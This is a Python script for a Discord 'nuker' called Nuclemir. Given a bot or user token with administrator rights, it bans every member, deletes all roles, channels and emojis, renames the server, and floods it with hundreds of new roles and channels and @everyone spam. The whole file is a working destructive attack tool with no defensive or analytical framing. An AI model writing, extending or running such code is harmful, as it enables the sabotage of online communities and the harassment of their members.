import discord
import asyncio
import requests
from io import BytesIO
from rich.console import Console
from rich.progress import track
from tqdm import tqdm
import time

console = Console()

class Nuclemir:
    def __init__(self):
        self.token = input("Enter your Discord token: ")
        self.server_id = int(input("Enter server ID: "))
        self.guild = None
        self.session = requests.Session()
        self.assets = {}
        self.prepare_assets()

    def prepare_assets(self):
        """Download and store required assets locally"""
        try:
            console.log("[yellow]Downloading assets...[/yellow]")
            img_url = "https://i.imgur.com/CWMec9F.jpeg"
            headers = {
            'Referer': 'https://google.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            for _ in range(5):
                try:
                    response = self.session.get(img_url, headers=headers, timeout=10)
                    response.raise_for_status()
                    self.assets["icon"] = BytesIO(response.content)
                    console.log("[green]Assets downloaded successfully[/green]")
                    return
                except Exception as e:
                    console.log(f"[red]Download failed attempt {_+1}/5: {e}[/red]")
                    time.sleep(2)
            console.log("[red]Failed to download assets after 5 attempts[/red]")
        except Exception as e:
            console.log(f"[red]Asset preparation error: {e}[/red]")

    async def retry_async(self, coro_func, **kwargs):
        """Retry decorator for async functions"""
        for attempt in range(5):
            try:
                return await coro_func(**kwargs)
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = e.retry_after or 5
                    console.log(f"[yellow]Rate limited. Retrying in {retry_after}s[/yellow]")
                    await asyncio.sleep(retry_after)
                elif attempt < 4:
                    console.log(f"[yellow]Attempt {attempt+1}/5 failed: {e}[/yellow]")
                    await asyncio.sleep(1.5 * (attempt + 1))
                else:
                    console.log(f"[red]Failed after 5 attempts: {e}[/red]")
            except Exception as e:
                console.log(f"[red]Unexpected error: {e}[/red]")
                break

    async def check_permissions(self):
        self.guild = self.client.get_guild(self.server_id)
        if not self.guild:
            raise Exception("Server not found")
        
        member = self.guild.get_member(self.client.user.id)
        if not member.guild_permissions.administrator and member.id != self.guild.owner_id:
            raise Exception("Insufficient permissions (Requires administrator)")

    async def ban_members(self):
        console.log("[cyan]Initiating member ban procedure...[/cyan]")
        for member in tqdm(self.guild.members, desc="Banning members", unit="member"):
            if member != self.client.user:
                await self.retry_async(member.ban, reason="Nuclemir")

    async def delete_roles(self):
        console.log("[cyan]Clearing roles...[/cyan]")
        for role in tqdm(self.guild.roles, desc="Deleting roles", unit="role"):
            if role.name != "@everyone":
                await self.retry_async(role.delete)

    async def delete_channels(self):
        console.log("[cyan]Clearing channels...[/cyan]")
        for channel in tqdm(self.guild.channels, desc="Deleting channels", unit="channel"):
            await self.retry_async(channel.delete)

    async def modify_guild(self):
        console.log("[cyan]Modifying server settings...[/cyan]")
        try:
            if self.assets.get("icon"):
                await self.retry_async(self.guild.edit, name="isfendiyar", icon=self.assets["icon"].read())
        except Exception as e:
            console.log(f"[red]Server modification failed: {e}[/red]")

    async def create_roles(self):
        console.log("[cyan]Creating new roles...[/cyan]")
        for _ in tqdm(range(250), desc="Creating roles", unit="role"):
            await self.retry_async(self.guild.create_role, name="isfendiyar")

    async def create_channels(self):
        console.log("[cyan]Creating new channels...[/cyan]")
        for _ in tqdm(range(500), desc="Creating channels", unit="channel"):
            await self.retry_async(self.guild.create_text_channel, name="isfendiyar")

    async def spam_messages(self):
        console.log("[cyan]Initiating message spam...[/cyan]")
        for channel in tqdm(self.guild.text_channels, desc="Spamming channels", unit="channel"):
            await self.retry_async(channel.send, content="@everyone isfendiyar")

    async def modify_vanity(self):
        console.log("[cyan]Attempting vanity URL modification...[/cyan]")
        if 'VANITY_URL' in self.guild.features:
            await self.retry_async(self.guild.edit, vanity_code="isfendiyar")

    async def handle_emojis(self):
        console.log("[cyan]Updating emojis...[/cyan]")
        for emoji in tqdm(self.guild.emojis, desc="Deleting emojis", unit="emoji"):
            await self.retry_async(emoji.delete)

        if self.assets.get("icon"):
            for i in tqdm(range(250), desc="Creating emojis", unit="emoji"):
                self.assets["icon"].seek(0)
                await self.retry_async(
                    self.guild.create_custom_emoji,
                    name=f"isfendiyar_{i}",
                    image=self.assets["icon"].read()
                )

    async def execute_safely(self, coro):
        """Wrapper for error handling"""
        try:
            await coro
        except Exception as e:
            console.log(f"[red]Error in {coro.__name__}: {e}[/red]")

    async def start(self):
        console.print("""
[red]
███╗   ██╗██╗   ██╗ ██████╗██╗     ███████╗███╗   ███╗██╗██████╗ 
████╗  ██║██║   ██║██╔════╝██║     ██╔════╝████╗ ████║██║██╔══██╗
██╔██╗ ██║██║   ██║██║     ██║     █████╗  ██╔████╔██║██║██████╔╝
██║╚██╗██║██║   ██║██║     ██║     ██╔══╝  ██║╚██╔╝██║██║██╔══██╗
██║ ╚████║╚██████╔╝╚██████╗███████╗███████╗██║ ╚═╝ ██║██║██║  ██║
╚═╝  ╚═══╝ ╚═════╝  ╚═════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
[/red]""")

        self.client = discord.Client()

        @self.client.event
        async def on_ready():
            try:
                console.log("[green]Connected to Discord[/green]")
                await self.check_permissions()
                
                operations = [
                    self.ban_members,
                    self.delete_roles,
                    self.delete_channels,
                    self.modify_guild,
                    self.create_roles,
                    self.create_channels,
                    self.spam_messages,
                    self.modify_vanity
                ]

                for op in track(operations, description="Processing operations..."):
                    await self.execute_safely(op())

                if console.input("[yellow]Proceed with emoji operations? (y/n): [/yellow]").lower() == 'y':
                    await self.execute_safely(self.handle_emojis())

                console.log("[bold green]Operation Hiroshima Completed[/bold green]")
            except Exception as e:
                console.log(f"[bold red]Fatal Error: {e}[/bold red]")
            finally:
                await self.client.close()

        try:
            await self.client.start(self.token)
        except discord.LoginFailure:
            console.log("[bold red]Invalid token provided[/bold red]")
        except Exception as e:
            console.log(f"[bold red]Connection error: {e}[/bold red]")

if __name__ == "__main__":
    asyncio.run(Nuclemir().start())
